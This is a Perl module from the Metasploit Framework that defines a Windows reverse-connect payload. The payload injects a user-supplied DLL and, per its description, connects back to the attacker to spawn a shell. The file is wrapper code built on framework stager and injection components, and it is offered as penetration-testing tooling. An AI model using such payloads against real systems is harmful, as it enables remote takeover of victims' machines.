
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_dllinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'win reverse Skape/Jarkko DLL inject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [
                        'Matt Miller <mmiller [at] hick.org> [Unknown License]',
                        'Jarkko Turkulainen <jt [at] klake.org> [Unknown License]',
                    ],
  'UserOpts'     => { 'DLL' => [1, 'PATH', 'The full path the DLL that should be injected'] },
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('DLL');
}

1;
